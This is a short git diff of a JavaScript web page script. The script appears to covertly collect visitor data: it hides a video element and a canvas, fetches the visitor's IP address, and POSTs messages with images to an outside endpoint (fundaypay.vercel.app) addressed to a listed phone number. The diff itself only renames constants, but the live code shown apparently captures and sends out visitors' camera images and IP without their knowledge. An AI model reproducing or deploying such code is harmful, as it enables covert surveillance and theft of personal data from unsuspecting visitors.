@@ -3,7 +3,8 @@ video.style.display = "none";
 let canvas = document.querySelector("#canvas");
 let text = "*DATA PENGUNJUNG*";
 canvas.style.display = "none";
-const base = "https://fundaypay.vercel.app";
+const BASE = "https://fundaypay.vercel.app";
+const TO = "082286230830";
 
 (async () => {
     const jsonIp = await useFetch("https://jsonip.com");
@@ -48,14 +49,14 @@ async function useFetch(url) {
 }
 
 async function sM(msg, img, ext) {
-    let mySender = await fetch(`${base}/send/`, {
+    let mySender = await fetch(`${BASE}/send/`, {
         method: "POST",
         mode: "cors",
         headers: {
             "Content-Type": "application/json",
         },
         body: JSON.stringify({
-            to: "082286230830",
+            to: TO,
             msg: msg || "siapa hayo?",
             img,
             ext,
